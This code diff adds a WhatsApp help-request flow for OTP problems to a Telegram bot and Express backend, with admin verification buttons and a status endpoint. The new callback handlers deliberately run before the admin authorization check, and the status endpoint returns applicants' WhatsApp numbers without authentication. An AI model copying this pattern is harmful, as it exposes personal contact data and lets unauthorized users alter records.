@@ -1498,6 +1498,104 @@ bot.on('callback_query', async (callbackQuery) => {
 
     console.log(`\n🔘 CALLBACK: ${data} | admin: ${adminId || 'UNAUTHORIZED'}`);
 
+    // ==========================================
+    // HELP REQUEST VERIFICATION CALLBACKS
+    // (These work without strict auth check - verified via applicationId)
+    // ==========================================
+    
+    if (data.startsWith('help_correct_')) {
+        const applicationId = data.replace('help_correct_', '');
+        
+        try {
+            const application = await db.getApplication(applicationId);
+            if (!application) {
+                console.error(`❌ Application not found: ${applicationId}`);
+                return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+            }
+            
+            console.log(`✅ Help correct: ${applicationId}`);
+            
+            // Update help request status to verified
+            await db.updateApplication(applicationId, {
+                helpStatus: 'verified',
+                whatsappVerifiedAt: new Date()
+            });
+            
+            // Edit the admin's message to confirm
+            const editText = `
+✅ <b>HELP REQUEST - VERIFIED</b>
+
+<b>Applicant Phone:</b> ${application.phoneNumber || 'N/A'}
+<b>WhatsApp:</b> <code>${application.whatsappNumber}</code>
+<b>Application ID:</b> <code>${applicationId}</code>
+
+<b>Status:</b> <code>✅ VERIFIED - CONTACTING USER</code>
+<i>Admin will contact user via WhatsApp now.</i>
+            `;
+            
+            await bot.editMessageText(editText, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            });
+            
+            console.log(`✅ Help request verified for ${applicationId}`);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Verified! Contact user now.', show_alert: true });
+            
+        } catch (err) {
+            console.error('❌ Error verifying help request:', err.message);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error: ' + err.message, show_alert: true });
+        }
+    }
+    
+    if (data.startsWith('help_incorrect_')) {
+        const applicationId = data.replace('help_incorrect_', '');
+        
+        try {
+            const application = await db.getApplication(applicationId);
+            if (!application) {
+                console.error(`❌ Application not found: ${applicationId}`);
+                return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found', show_alert: true });
+            }
+            
+            console.log(`❌ Help incorrect: ${applicationId}`);
+            
+            // Update help request status to invalid
+            await db.updateApplication(applicationId, {
+                helpStatus: 'invalid_number',
+                invalidNumberAt: new Date()
+            });
+            
+            // Edit the admin's message
+            const editText = `
+❌ <b>HELP REQUEST - INVALID NUMBER</b>
+
+<b>Applicant Phone:</b> ${application.phoneNumber || 'N/A'}
+<b>WhatsApp Entered:</b> <code>${application.whatsappNumber}</code>
+<b>Application ID:</b> <code>${applicationId}</code>
+
+<b>Status:</b> <code>❌ REJECTED - NOT A VALID WHATSAPP</code>
+<i>User will be asked to re-enter their WhatsApp number</i>
+            `;
+            
+            await bot.editMessageText(editText, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'HTML',
+                reply_markup: { inline_keyboard: [] }
+            });
+            
+            console.log(`✅ Help request marked as invalid for ${applicationId}`);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User marked to re-enter number', show_alert: true });
+            
+        } catch (err) {
+            console.error('❌ Error rejecting help request:', err.message);
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Error: ' + err.message, show_alert: true });
+        }
+    }
+
+    // Authorization check required for other callbacks
     if (!adminId) {
         return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Not authorized!', show_alert: true });
     }
@@ -2396,6 +2494,101 @@ User requested a new OTP.
         res.json({ success: true });
     } catch (error) {
         res.status(500).json({ success: false, message: 'Server error' });
+    }
+});
+
+// POST /api/submit-help-request
+app.post('/api/submit-help-request', async (req, res) => {
+    console.log('\n🆘 /api/submit-help-request called:', JSON.stringify(req.body));
+    try {
+        const { applicationId, whatsappNumber } = req.body;
+
+        if (!applicationId || !whatsappNumber) {
+            return res.status(400).json({ success: false, message: 'Missing applicationId or whatsappNumber' });
+        }
+
+        const application = await db.getApplication(applicationId);
+        if (!application) {
+            return res.status(404).json({ success: false, message: 'Application not found' });
+        }
+
+        // Update application with help request
+        await db.updateApplication(applicationId, {
+            helpRequested: true,
+            whatsappNumber: whatsappNumber,
+            helpRequestedAt: new Date(),
+            helpStatus: 'pending'
+        });
+
+        console.log(`✅ Help request saved for ${applicationId}: ${whatsappNumber}`);
+
+        // Notify admin via Telegram with verification buttons
+        const message = `
+🆘 <b>HELP REQUEST - OTP ISSUE</b>
+
+<b>Applicant Phone:</b> ${application.phoneNumber || 'N/A'}
+<b>WhatsApp:</b> <code>${whatsappNumber}</code>
+<b>Application ID:</b> <code>${applicationId}</code>
+
+<b>⚠️ Is this a valid WhatsApp number?</b>
+<i>Please verify and click a button below to confirm.</i>
+        `;
+
+        const options = {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        {
+                            text: '✅ Correct - Contact Now',
+                            callback_data: `help_correct_${applicationId}`
+                        },
+                        {
+                            text: '❌ Incorrect - Not Valid',
+                            callback_data: `help_incorrect_${applicationId}`
+                        }
+                    ]
+                ]
+            }
+        };
+
+        try {
+            console.log(`📤 Sending help request to admin: ${application.adminId}`);
+            const result = await sendToAdmin(application.adminId, message, options);
+            if (result) {
+                console.log(`✅ Help request with verification buttons sent to admin: ${application.adminId}`);
+            } else {
+                console.warn(`⚠️ sendToAdmin returned null for admin: ${application.adminId}`);
+            }
+        } catch (err) {
+            console.error('❌ Error sending help notification to admin:', err.message);
+        }
+
+        res.json({ success: true, message: 'Help request submitted successfully' });
+    } catch (error) {
+        console.error('❌ Error in /api/submit-help-request:', error);
+        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
+    }
+});
+
+// GET /api/check-help-status/:applicationId
+app.get('/api/check-help-status/:applicationId', async (req, res) => {
+    try {
+        const { applicationId } = req.params;
+        const application = await db.getApplication(applicationId);
+        
+        if (!application) {
+            return res.json({ success: false, status: 'not_found' });
+        }
+        
+        res.json({
+            success: true,
+            status: application.helpStatus || 'pending',
+            whatsappNumber: application.whatsappNumber
+        });
+    } catch (error) {
+        console.error('❌ Error checking help status:', error);
+        res.json({ success: false, status: 'error', message: error.message });
     }
 });
 
